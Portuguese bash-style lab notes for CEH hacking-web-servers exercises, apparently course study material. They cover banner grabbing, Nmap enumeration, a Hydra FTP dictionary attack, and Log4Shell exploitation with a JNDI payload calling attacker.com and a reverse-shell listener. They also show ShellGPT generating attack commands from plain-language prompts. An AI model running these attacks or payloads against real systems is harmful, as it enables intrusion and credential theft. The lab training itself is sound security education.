#!/bin/bash



###############
# MOD 13 - Lab 1: Footprint the Web Server
###############

########
# TASK 1: Footprint a Web Server using Netcat and Telnet
########

# Objetivo
# Realizar footprinting de um servidor web usando ferramentas simples como Netcat e Telnet
# Coletar banners e identificar o tipo de servidor, versão e outras informações úteis antes de realizar testes de intrusão.

# Configuração inicial
#   Máquina usada: Parrot Security OS
#   Permissão root: Necessária para alguns comandos
#   Alvo: www.moviescope.com, porta 80 (HTTP)

# Obter acesso root
sudo su
#   Explicação:
#       Eleva os privilégios para o usuário root. Será necessário digitar a senha toor.

# Usar o Netcat (nc) para banner grabbing
nc -vv www.moviescope.com 80
#   Parâmetros usados:
#       nc: Netcat, ferramenta de rede para conexões TCP/UDP.
#       -vv: Modo “very verbose” — mostra detalhes completos da conexão.
#       www.moviescope.com: Host alvo.
#       80: Porta do servidor HTTP.
#   Objetivo: 
#       Estabelecer conexão com o servidor na porta 80 (HTTP).

# Após a conexão, enviar a requisição HTTP manualmente:
GET / HTTP/1.0
#   (Siga de duas teclas Enter após o comando)
#   Explicação:
#       GET /: Solicita a página raiz /.
#       HTTP/1.0: Versão do protocolo HTTP usada na requisição.
#       Pressionar duas vezes Enter é necessário para finalizar a requisição.
#   Resultado esperado:
#       Banner do servidor (ex: Apache, nginx, Microsoft IIS)
#       Informações como:
#           Content-Type
#           Last-Modified
#           Accept-Ranges
#           ETag
#           Server

# Limpar a tela
clear
#   Explicação:
#       Comando simples para limpar o terminal, removendo os dados anteriores e organizando a visão para a próxima etapa.

# Banner Grabbing com Telnet
telnet www.moviescope.com 80
#   Explicação:
#       telnet: Cliente que permite comunicação com serviços TCP.
#       www.moviescope.com: Domínio alvo.
#       80: Porta padrão HTTP.
#   Pode ser necessário instalar o telnet usando:
apt install telnet

# Enviar novamente a requisição manualmente:
GET / HTTP/1.0
#   (Siga de duas teclas Enter)
#   Resultado esperado:
#       Mesmo banner HTTP que no Netcat:
#           Tipo de servidor (Apache/nginx/IIS)
#           Versão do servidor
#           Metadata do conteúdo HTTP

# Informações que podem ser coletadas (banner)
#   Server	            Nome e versão do servidor HTTP
#   Content-Type	    Tipo de conteúdo (ex: text/html)
#   Last-Modified	    Última modificação do recurso
#   ETag	            ID de versão do recurso (útil para cache e rastreio)
#   Accept-Ranges	    Suporte a download por partes
#   Content-Length	    Tamanho do conteúdo

# Ferramentas envolvidas no processo
#   Netcat (nc)	        Conecta-se a portas TCP para enviar/receber dados
#   Telnet	            Permite comunicação com serviços via protocolo TCP
#   GET / HTTP/1.0	    Comando HTTP para coletar o cabeçalho/banner do servidor

# Finalidade Prática
#   Esses comandos simulam uma técnica de banner grabbing, com o intuito de:
#       Identificar o servidor (ex: Server: Apache/2.4.41 (Ubuntu))
#       Descobrir possíveis vulnerabilidades conhecidas
#       Preparar o ambiente para futuras explorações específicas


########
# TASK 2: Enumerate Web Server Information using Nmap Scripting Engine (NSE)
########

# Objetivo
#   Usar o Nmap com NSE (Nmap Scripting Engine) para descobrir diretórios, funcionalidades ativas, hostnames, métodos HTTP inseguros, e presença de WAF/IPS/IDS no servidor web alvo
#   Reconhecer avançado e descoberta de vulnerabilidades

# Pré-requisitos
#   Sistema: Parrot Security OS
#   Terminal com acesso root:
sudo su
#   Senha padrão: toor

# Enumeração de diretórios e arquivos com http-enum.nse
nmap -sV --script=http-enum www.goodshopping.com
#   Explicação dos parâmetros:
#       -sV: Detecta a versão dos serviços em execução.
#       --script=http-enum: Usa o script NSE http-enum para enumerar diretórios, arquivos e páginas comuns.
#       www.goodshopping.com: Domínio alvo.

# Utilidade:
#   Esse script vasculha o servidor web em busca de diretórios, aplicações e arquivos comuns que possam estar expostos, como:
/phpmyadmin/
/admin/
/wordpress/
/backup.zip
#   Esse tipo de enumeração é extremamente útil para encontrar pontos de entrada e pastas esquecidas (como instaladores antigos do WordPress ou PrestaShop).

# Descoberta de hostnames (subdomínios) com hostmap-bfk
nmap --script hostmap-bfk --script-args hostmap-bfk.prefix=hostmap- www.goodshopping.com
#   Parâmetros importantes:
#       s--script hostmap-bfk: Script NSE que tenta encontrar subdomínios/hostnames do domínio alvo.
#       s--script-args hostmap-bfk.prefix=hostmap-: Argumento que define o prefixo usado na enumeração.
#       swww.goodshopping.com: Domínio alvo.
#   Utilidade:
#     Descobre subdomínios ativos (como mail.goodshopping.com, dev.goodshopping.com, etc.), o que amplia a superfície de ataque.

# Verificação do método HTTP TRACE com http-trace.nse
nmap --script http-trace -d www.goodshopping.com
#   Parâmetros:
#       --script http-trace: Usa script NSE que verifica se o método TRACE está habilitado.
#       -d: Ativa modo de depuração (debug), para ver mais detalhes.
#       www.goodshopping.com: Alvo.
#   Utilidade:
#       O método HTTP TRACE pode permitir ataques do tipo Cross Site Tracing (XST), que é uma variação do XSS. Se estiver habilitado, é uma falha grave de segurança.

# Detecção de Web Application Firewall (WAF)
nmap -p80 --script http-waf-detect www.goodshopping.com
#   Parâmetros:
#       -p80: Define que o scan será na porta 80 (HTTP).
#       --script http-waf-detect: Script NSE que detecta se há algum WAF, IPS ou IDS.
#       www.goodshopping.com: Alvo.
#   Utilidade:
#       Tenta injetar payloads maliciosos leves e analisa a resposta do servidor para detectar presença de filtros como:
#           ModSecurity
#           Cloudflare
#           Imperva
#           AWS WAF
#           F5 BigIP
#   Saber da presença de um WAF pode mudar sua estratégia de ataque — por exemplo, você pode precisar usar evasão com encoding ou fragmentação de pacotes.

# Importância prática das descobertas
#   Descoberta	                        Significado prático
#   Diretórios sensíveis expostos	    Pode levar a RCE, LFI, download de arquivos, etc
#   Subdomínios ativos	                Novos vetores de ataque (dev/test/email etc)
#   Método TRACE habilitado	            Risco de Cross Site Tracing (XST)
#   WAF detectado	                    Exige técnicas de evasão (obfuscation, encoding, fragmentação)

# Encerramento
#   Após todos os comandos:
exit
#   Ou feche a janela do terminal.


###############
# MOD 13 - Lab 2: Perform a Web Server Attack
###############

########
# TASK 1: Crack FTP Credentials using a Dictionary Attack
########

# Objetivo:
#   Simular ataques reais a um servidor web com foco em:
#   Crackear credenciais FTP por ataque de dicionário com Hydra.
#   Explorar vulnerabilidade crítica Log4j para ganhar acesso remoto ao servidor.

# Ferramentas Utilizadas
#   Nmap → Para descobrir serviços ativos (ex: FTP).
#   Hydra → Para ataque de força bruta com dicionário.
#   FTP (comando nativo) → Para autenticação e acesso remoto ao servidor.
#   Log4Shell Exploit (implícito no objetivo do Lab).
#   Sistema Parrot Security → Como máquina atacante.
#   Windows 11 → Como máquina alvo (com FTP ativo).

# Obter acesso root na máquina Parrot
sudo su
#   Senha: toor
#   Isso garante permissões administrativas para rodar ferramentas como Nmap e Hydra.

# Descobrir se a porta FTP está aberta com Nmap
nmap -p 21 10.10.1.11
#   Interpretação:
#       Verifica se a porta 21 (FTP) está aberta na máquina alvo 10.10.1.11. Se o resultado mostrar:
21/tcp open ftp
#       Significa que o serviço está ativo.

# Testar conexão FTP manualmente
ftp 10.10.1.11
#   Tentar fazer login com qualquer combinação, por exemplo:
#       Name: test
#       Password: 1234
#   O objetivo aqui é confirmar que há um servidor FTP rodando e que requer autenticação.

# Preparar os arquivos de dicionário (usuários e senhas)
# Ir até:
#   Places → Desktop → CEHv13 Module 13 Hacking Web Servers
#   Copiar a pasta Wordlists para a área de trabalho:
#       Ctrl+C para copiar
#       Ctrl+V na área de trabalho para colar
#   A pasta deve conter:
#       Usernames.txt (nomes de usuários)
#       Passwords.txt (senhas)

# Executar ataque de dicionário com Hydra
hydra -L /home/attacker/Desktop/Wordlists/Usernames.txt -P /home/attacker/Desktop/Wordlists/Passwords.txt ftp://10.10.1.11
#   Parâmetros explicados:
#       -L → Lista de usernames
#       -P → Lista de senhas
#       ftp:// → Protocolo a ser atacado
#       10.10.1.11 → IP do alvo
#   O Hydra testa todas as combinações possíveis de usuário e senha. Após algum tempo, vai apresentar algo como:
[21][ftp] host: 10.10.1.11 login: Martin password: apple
#   Você obteve as credenciais válidas: Martin : apple

# Acessar o FTP com as credenciais encontradas
ftp 10.10.1.11
#   Quando solicitado:
Name: Martin
Password: apple
#       A conexão será estabelecida e você estará logado no FTP da máquina alvo.

# Criar um diretório remoto via FTP
#   Dentro da sessão FTP:
mkdir Hacked
#       Isso cria um diretório no servidor remoto, provando que você tem acesso de escrita.

# Verificar resultado na máquina Windows
#   Vá até o Windows 11
#   Navegue para:
C:\FTP\
#       Você verá a pasta Hacked criada.

# Visualizar comandos disponíveis no FTP
#   Dentro da sessão FTP:
help
#   Isso lista todos os comandos possíveis como:
ls
cd
put
get
delete
mkdir
rmdir
# etc...

# Encerrar a sessão FTP
quit

# Possíveis Extensões para Pentest Real
#   Caso o laboratório peça exploração adicional (como indicado no título da segunda parte), você pode explorar:

# Log4j RCE (Log4Shell)
#   Essa parte é mencionada nos objetivos, mas não está descrita passo a passo. Em cenários reais, seria usada uma ferramenta como:
#       JNDIExploit
#       Burp Suite
#       Scripts personalizados (como log4shell-payload-generator.py)

# Exemplo de comando (genérico):
curl -H 'User-Agent: ${jndi:ldap://attacker.com/a}' http://victim.com

# Essa etapa precisa de:
#   Um listener (por exemplo, com nc -lvnp 1389)
#   Um servidor LDAP falso (via marshalsec, por exemplo)
#   Se quiser, posso montar esse passo a passo de exploração Log4j também.

# Conclusão
#   Você aprendeu a:
#       Descobrir portas abertas com Nmap
#       Confirmar um serviço ativo (FTP)
#       Executar ataque de dicionário com Hydra
#       Acessar remotamente um servidor FTP
#       Criar conteúdo remotamente no alvo
#       Verificar o sucesso visualmente (via máquina Windows)


########
# TASK 2: Gain Access to Target Web Server by Exploiting Log4j Vulnerability
########

# Objetivo: 
#   Obter shell reversa explorando falha RCE no Log4j

# Etapas na Máquina Ubuntu (Servidor vulnerável)
#   Acessar como superusuário
sudo su
#         senha: toor
#     Garante privilégios administrativos.
#   Instalar e configurar o Docker
sudo apt-get update
sudo apt-get install docker.io
docker.io será usado para subir o servidor vulnerável Log4j.
#   Subir o servidor vulnerável Log4j com Docker
cd log4j-shell-poc/
docker build -t log4j-shell-poc .
docker run --network host log4j-shell-poc
#          build: cria a imagem docker do servidor vulnerável.
#          --network host: expõe a porta diretamente na máquina host (Ubuntu).
#      Agora o servidor está escutando na porta 8080.

# Etapas na Máquina Parrot Security (Atacante)
#   Escanear serviços da máquina alvo
nmap -sV -sC 10.10.1.9
#       -sV: detecta versão dos serviços.
#       -sC: usa scripts padrão do Nmap.
#   Descobre que Apache Tomcat/Coyote 1.1 está rodando na porta 8080.
#   Buscar exploits com Searchsploit
searchsploit -t Apache RCE
#       -t: busca por termo específico (RCE).
#   Confirma que há exploit RCE no Log4j (Apache Log4j 2 - RCE).
#   Verificar o site vulnerável via navegador
http://10.10.1.9:8080
#       Mostra a página vulnerável que usaremos para injetar o payload.
#   Preparar o ambiente de exploit
#       Instalar JDK e configurar caminho no script poc.py
sudo su
#           senha: toor
tar -xf jdk-8u202-linux-x64.tar.gz
mv jdk1.8.0_202 /usr/bin/
#       Extrai e move o Java necessário para compilar o payload da reverse shell.
#   Editar poc.py para apontar para novo JDK
pluma poc.py
#       Alterações necessárias:
#           Linha 62:
/usr/bin/jdk1.8.0_202/bin/javac
#           Linha 87 e 99:
/usr/bin/jdk1.8.0_202/bin/java
#   Define o compilador e executor Java correto.
#   Criar o listener com Netcat
nc -lvp 9001
#           -l: escutar.
#           -v: modo verboso.
#           -p: porta de escuta (9001).
#       Aguardará a conexão reversa.
#   Executar o script de exploit (gera o payload e inicia o servidor web)
python3 poc.py --userip 10.10.1.13 --webport 8000 --lport 9001
#           --userip: IP do atacante (Parrot Security).
#           --webport: porta do servidor HTTP para servir a classe Java.
#           --lport: porta que receberá a reverse shell.
#       O script gerará um payload semelhante a:
${jndi:ldap://10.10.1.13:1389/a}
#   Injetar o payload via formulário web
#       No navegador:
#           Acesse: 
http://10.10.1.9:8080
#           Cole o payload no campo Username
#           Senha: qualquer coisa
#           Clique em Login
#       A aplicação processará o input com Log4j → fará o LDAP lookup → executará o bytecode malicioso → conexão reversa aberta!
#   Verificar Shell reversa no Netcat
#       No terminal do listener:
pwd        # mostra diretório atual
whoami     # mostra usuário atual (ex: root)
#       Shell obtida com sucesso.

# Conclusão
#   Com esses passos:
#       Você instalou um servidor vulnerável ao Log4j com Docker;
#       Descobriu o serviço vulnerável com Nmap;
#       Criou um payload de exploit usando poc.py com JDK personalizado;
#       Injetou o payload via input do usuário na aplicação web;
#       Recebeu uma shell reversa como root, mostrando o impacto crítico da falha.


###############
# MOD 13 - Lab 3: Perform a Web Server Hacking using AI
###############

########
# TASK 1: Perform Web Server Footprinting and Attacks using ShellGPT
########

# Objetivo
#   Simular um processo de invasão a um servidor web utilizando ferramentas com IA, especificamente com o ShellGPT. 
#   Automatizar de footprinting, fingerprinting, ataques (como brute force e directory traversal) e extração de dados sensíveis por meio de AI.

# Ferramenta Principal
# ShellGPT: É uma interface de linha de comando que utiliza IA (como modelos da OpenAI) para gerar, executar e automatizar comandos shell com base em linguagem natural.

# Pré-requisitos
#   Acessar a máquina Parrot Security
#   Login:
#       Usuário: attacker
#       Senha: toor
#   Obter privilégios root:
sudo su
#   Executar script de configuração do ShellGPT:
bash sgpt.sh
#   Inserir sua AI Activation Key (obtida no módulo 00 ou via PDF).

# Directory Traversal com GoBuster
sgpt --shell "Perform a directory traversal on target url https://certifiedhacker.com using gobuster"
#   Objetivo:
#       Enumerar diretórios e arquivos ocultos do site https://certifiedhacker.com usando o gobuster.
#   O que a IA faz:
#       Gera e executa um comando como:
gobuster dir -u https://certifiedhacker.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# Ataque de Força Bruta FTP com Hydra
sgpt --shell "Attempt FTP login on target IP 10.10.1.11 with hydra using usernames and passwords file from /home/attacker/Wordlists"
#   Objetivo:
#     Tentar autenticação forçada via FTP no IP 10.10.1.11.
#   Comando gerado pela IA pode ser:
hydra -L /home/attacker/Wordlists/usernames.txt -P /home/attacker/Wordlists/passwords.txt ftp://10.10.1.11

# Footprinting do Web Server (análise geral)
sgpt --shell "Perform webserver footprinting on target IP 10.10.1.22"
#   Objetivo:
#       Realizar fingerprinting do servidor web (obter sistema operacional, tipo de servidor, headers HTTP, etc.).
#   Comandos possíveis gerados:
nmap -sV -p 80,443 10.10.1.22
curl -I http://10.10.1.22

# Footprinting com Netcat (banner grabbing)
sgpt --shell "Perform web server footprinting on target IP 10.10.1.22 using Netcat by sending an HTTP request and analyzing the response."
#   Comando gerado pela IA:
nc -nv 10.10.1.22 80
#   Em seguida, enviar:
GET / HTTP/1.0
#   Utilidade:
#       O netcat mostra o banner do servidor web: tipo de servidor, data, conteúdo, cache, etc. (muito útil para detectar vulnerabilidades específicas).

# Espelhamento (mirroring) do site com ShellGPT
sgpt --shell "Mirror the target website certifiedhacker.com"
#   Alternativa mais específica com HTTrack:
sgpt --shell "Mirror the target website https://certifiedhacker.com with httrack on desktop"
#   Comando gerado:
httrack https://certifiedhacker.com -O ~/Desktop/certifiedhacker.com
#   Utilidade:
#       Baixar o conteúdo completo do site localmente para análise offline, fuzzing, engenharia reversa ou procura de informações sensíveis.
#   Abrir site espelhado:
#       Vá até:
Places → Home Folder → certifiedhacker.com → index.html
#   Clique duas vezes para abrir no Firefox.

# Encerramento do Lab
#   Fechar todas as janelas abertas.
#   Documentar:
#       IPs e domínios testados.
#       Comandos usados.
#       Diretórios descobertos.
#       Vulnerabilidades observadas (ex: método TRACE, FTP anônimo, diretórios sensíveis, etc.).

# Resumo dos Comandos ShellGPT
sgpt --shell "Perform a directory traversal on target url https://certifiedhacker.com using gobuster"	Descobrir diretórios ocultos
sgpt --shell "Attempt FTP login on target IP 10.10.1.11 with hydra using usernames and passwords file from /home/attacker/Wordlists"	Ataque de força bruta FTP
sgpt --shell "Perform webserver footprinting on target IP 10.10.1.22"	Coletar informações básicas do servidor
sgpt --shell "Perform web server footprinting on target IP 10.10.1.22 using Netcat"	Banner grabbing via Netcat
sgpt --shell "Mirror the target website certifiedhacker.com"	Clonar o site para análise offline
sgpt --shell "Mirror the target website https://certifiedhacker.com with httrack on desktop"	Clonagem do site usando HTTrack

# Quer ir além?
#   Com o ShellGPT, você pode executar muitos outros comandos com linguagem natural, como:
sgpt --shell "Scan the website https://target.com for SQL injection vulnerabilities using sqlmap"
sgpt --shell "Check for XSS on target https://vulnerable.com using XSStrike"
sgpt --shell "Run Nikto scan on https://webapp.com"
